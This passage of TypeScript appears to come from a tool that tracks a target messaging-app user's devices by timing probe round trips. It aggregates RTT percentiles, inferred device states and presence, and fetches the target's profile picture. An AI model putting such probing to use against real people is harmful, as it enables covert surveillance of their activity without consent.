        // Build devices array with enhanced metrics
        const devices = Array.from(this.deviceMetrics.entries()).map(([jid, metrics]) => ({
            jid,
            state: metrics.state,
            rtt: metrics.lastRtt,
            avg: metrics.recentRtts.length > 0
                ? metrics.recentRtts.reduce((a: number, b: number) => a + b, 0) / metrics.recentRtts.length
                : 0,
            ema: metrics.ema,
            stateHistory: metrics.stateHistory,
            percentiles: {
                p25: metrics.baselineP25,
                p50: metrics.baselineP50,
                p75: metrics.baselineP75,
                p90: metrics.baselineP90
            },
            historyLength: metrics.rttHistory.length,
            rttHistory: metrics.rttHistory, // Send full RTT history for detailed charts
            // Calibration data for UI progress indicator
            calibration: {
                isCalibrated: metrics.calibration.isCalibrated,
                samplesCollected: metrics.calibration.samplesCollected,
                requiredSamples: metrics.calibration.requiredSamples,
                networkBaseline: metrics.calibration.networkBaseline
            },
            // Adjusted thresholds for debugging/display
            adjustedThresholds: metrics.thresholds.adjusted
        }));

        // Calculate global stats for backward compatibility
        const globalMedian = this.calculateGlobalMedian();
        const globalThreshold = globalMedian * 0.9;

        const data = {
            devices,
            deviceCount: this.trackedJids.size,
            presence: this.lastPresence,
            // Global stats for charts
            median: globalMedian,
            threshold: globalThreshold
        };

        if (this.onUpdate) {
            this.onUpdate(data);
        }
    }

    /**
     * Calculate global median RTT across all measurements
     * @returns Median RTT value
     */
    private calculateGlobalMedian(): number {
        if (this.globalRttHistory.length < 3) return 0;

        const sorted = [...this.globalRttHistory].sort((a, b) => a - b);
        const mid = Math.floor(sorted.length / 2);
        return sorted.length % 2 !== 0 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;
    }

    /**
     * Get profile picture URL for the target user
     * @returns Profile picture URL or null if not available
     */
    public async getProfilePicture() {
        try {
            return await this.sock.profilePictureUrl(this.targetJid, 'image');
        } catch (err) {
            return null;
        }
    }

    /**
     * Stop tracking and clean up resources
     */
    public stopTracking() {
        this.isTracking = false;

        // Clear all pending timeouts
        for (const timeoutId of this.probeTimeouts.values()) {
            clearTimeout(timeoutId);
        }
        this.probeTimeouts.clear();
        this.probeStartTimes.clear();

        logger.info('Stopping tracking');
    }
}
